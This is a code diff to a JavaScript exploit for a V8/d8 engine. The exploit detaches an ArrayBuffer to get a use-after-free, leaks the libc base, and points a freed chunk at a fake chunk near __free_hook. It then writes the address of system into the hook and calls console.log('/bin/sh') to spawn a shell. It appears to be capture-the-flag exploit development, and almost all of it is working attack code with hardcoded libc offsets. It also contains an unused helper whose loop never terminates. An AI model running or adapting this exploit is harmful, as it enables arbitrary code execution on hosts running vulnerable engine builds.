@@ -1,4 +1,3 @@
-//TODO: fix fastbin issue
 var buf = new ArrayBuffer(8); 
 var f64_buf = new Float64Array(buf);
 var u64_buf = new Uint32Array(buf);
@@ -16,6 +15,27 @@ function itof(val) {
 	return f64_buf[0];
 }
 
+function malloc(size){
+	    var a = {};
+	    a.length = size;
+	    var b = new Uint8Array(a);
+	    return b;
+}
+
+function setValue(target, value, offset){
+	var val = value;
+	var idx = 0;
+	var num = 1;	
+	while(val != 0){
+		//nsole.log(val);
+		//nsole.log(val % 0xffn);
+		num = Number(val%0xffn);
+		target[offset + idx] = num;
+		idx ++;
+		val >> 8n;
+	}
+	console.log("DONE");
+}
 function libcLeak(){
 	var arr1 =  new Float64Array(0x82);
 	%ArrayBufferDetach(arr1.buffer);
@@ -29,19 +49,26 @@ function libcLeak(){
 var libcBase = libcLeak();
 var mallocHook = libcBase + 0x3ebc30n;
 var freeHook = libcBase + 0x3ed8e8n;
-var fakeChunk = mallocHook - 0xbn - 0x18n + 0x10n;
-
+var fakeChunk = freeHook - 0x13n + 0x10n;
+var system = libcBase + 0x4f550n;
 console.log('[+] libc base : 0x'+libcBase.toString(16));
-console.log('[+] malloc hook : 0x'+mallocHook.toString(16));
+console.log('[+] system : 0x'+system.toString(16));
 console.log('[+] free hook : 0x'+freeHook.toString(16));
 var arr = new Float64Array(0xc);
 
-for(let i=0;i<0x8;i++){
-	var tmp = new ArrayBuffer(0x60);
-	%ArrayBufferDetach(tmp);
-}
 %ArrayBufferDetach(arr.buffer);
-gc();
+
 var typedarr = new Float64Array(0x1);
 typedarr[0] = itof(fakeChunk);
 arr.set(typedarr);
+
+var tmp = malloc(0x60);
+var hook = [];
+hook.length = 0x60;
+var hook_ = new Uint8Array(hook);
+var idx = 0;
+
+for(;idx<0x10;idx++){
+	hook_[3+idx] = Number((system >> BigInt(8* idx)) % 0x100n);
+}
+console.log('/bin/sh');
